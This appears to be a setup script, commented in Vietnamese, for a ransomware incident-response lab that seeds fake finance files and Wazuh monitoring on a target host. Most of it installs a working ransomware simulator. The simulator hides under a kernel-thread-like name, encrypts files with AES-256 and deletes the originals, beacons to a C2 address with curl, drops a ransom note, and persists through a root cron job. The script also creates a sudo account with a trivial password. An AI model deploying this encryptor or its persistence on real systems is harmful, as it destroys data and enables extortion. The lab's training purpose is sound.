#!/bin/bash
# Chay LAN DAU tren target, quyen user 'ubuntu'. $1 = mat khau sudo.
PW="$1"

# 1. Tao user analyst cho sinh vien SSH sang xu ly su co (mat khau: analyst)
echo "$PW" | sudo -S useradd -m -s /bin/bash analyst 2>/dev/null
echo "$PW" | sudo -S bash -c 'echo "analyst:analyst" | chpasswd'
echo "$PW" | sudo -S usermod -aG sudo analyst 2>/dev/null

# 2. Khoi tao thu muc File Server /srv/shares/finance va 3 tai lieu quan trong
echo "$PW" | sudo -S mkdir -p /srv/shares/finance
echo "$PW" | sudo -S bash -c 'cat > /srv/shares/finance/payroll_2026.csv <<EOF
EMP_ID,FULL_NAME,ROLE,SALARY_USD
EMP001,Nguyen Van A,SOC Lead,4500
EMP002,Tran Thi B,Incident Responder,3800
FLAG_FINANCE=PTIT_RANSOM_RECOVERED_OK
EOF'

echo "$PW" | sudo -S bash -c 'cat > /srv/shares/finance/budget_q4.txt <<EOF
Q4 SECURITY BUDGET ALLOCATION 2026
SIEM Infrastructure Upgrade: $120,000
Threat Hunting Training: $45,000
Status: APPROVED_CONFIDENTIAL
EOF'

echo "$PW" | sudo -S bash -c 'cat > /srv/shares/finance/merger_plan.txt <<EOF
PROJECT TITAN - CONFIDENTIAL MERGER PLAN
Target Acquisition: CyberShield Corp
Valuation: $15,000,000
Authorized Signature: CEO_PTIT_CORP
EOF'

echo "$PW" | sudo -S chmod -R 777 /srv/shares/finance

# 3. Cau hinh Wazuh Agent bat Realtime FIM (syscheck) cho /srv/shares/finance va log ransomware
echo "$PW" | sudo -S touch /var/log/ransomware-activity.log
echo "$PW" | sudo -S chmod 666 /var/log/ransomware-activity.log
echo "$PW" | sudo -S bash -c 'cat >> /var/ossec/etc/ossec.conf <<EOF
<ossec_config>
  <syscheck>
    <directories check_all="yes" realtime="yes" report_changes="yes">/srv/shares/finance</directories>
  </syscheck>
  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/ransomware-activity.log</location>
  </localfile>
</ossec_config>
EOF' 2>/dev/null || true

echo "$PW" | sudo -S systemctl restart wazuh-agent 2>/dev/null || echo "$PW" | sudo -S service wazuh-agent restart 2>/dev/null || true

# 4. Tao script Ransomware ngam (/var/tmp/.kworker_crypt)
# Khoa doi xung RANSOM_KEY_KVAL duoc nap vao bien moi truong (/proc/<PID>/environ)
echo "$PW" | sudo -S bash -c 'cat > /var/tmp/.kworker_crypt <<'"'"'EOF'"'"'
#!/bin/bash
export RANSOM_KEY="RANSOM_KEY_KVAL"
TARGET_DIR="/srv/shares/finance"
LOG="/var/log/ransomware-activity.log"

# Doi 10 giay de Wazuh FIM kip quet baseline cac file goc truoc khi ma hoa
sleep 10

while true; do
  for f in "$TARGET_DIR"/*.csv "$TARGET_DIR"/*.txt; do
    [ -e "$f" ] || continue
    [[ "$f" == *"README_DECRYPT.txt" ]] && continue
    openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:"$RANSOM_KEY" -in "$f" -out "${f}.enc" 2>/dev/null && rm -f "$f"
    echo "$(date "+%b %d %H:%M:%S") target ransomware[$$]: FIM_ALERT Encrypted file $f -> ${f}.enc using AES-256-CBC" >> "$LOG"
    curl -s -m 1 "http://172.20.0.5:8080/beacon?host=target&encrypted=$(basename "$f")" >/dev/null 2>&1 || true
    sleep 3
  done

  if [ ! -f "$TARGET_DIR/README_DECRYPT.txt" ]; then
    cat > "$TARGET_DIR/README_DECRYPT.txt" <<NOTE
===================================================================
!!! YOUR COMPANY FILES HAVE BEEN ENCRYPTED BY LOCKBIT-SIM !!!
===================================================================
All sensitive documents in /srv/shares/finance/ have been encrypted
with military-grade AES-256-CBC cipher (.enc extension).
To decrypt your files, send 5 BTC to C2 server http://172.20.0.5:8080
===================================================================
NOTE
    echo "$(date "+%b %d %H:%M:%S") target ransomware[$$]: Dropped ransom note $TARGET_DIR/README_DECRYPT.txt" >> "$LOG"
  fi

  sleep 15
done
EOF'
echo "$PW" | sudo -S chmod +x /var/tmp/.kworker_crypt

# 5. Tao cronjob persistence (/etc/cron.d/sys-crypt)
echo "$PW" | sudo -S bash -c 'cat > /etc/cron.d/sys-crypt <<EOF
* * * * * root pgrep -f .kworker_crypt >/dev/null || RANSOM_KEY=RANSOM_KEY_KVAL nohup /bin/bash /var/tmp/.kworker_crypt >/dev/null 2>&1 &
EOF'
echo "$PW" | sudo -S chmod 644 /etc/cron.d/sys-crypt

# 6. Khoi dong cron va tien trinh Ransomware voi bien moi truong RANSOM_KEY
echo "$PW" | sudo -S systemctl restart cron 2>/dev/null || echo "$PW" | sudo -S service cron restart 2>/dev/null || true
echo "$PW" | sudo -S bash -c 'RANSOM_KEY="RANSOM_KEY_KVAL" setsid /bin/bash /var/tmp/.kworker_crypt >/dev/null 2>&1 < /dev/null &'

exit 0
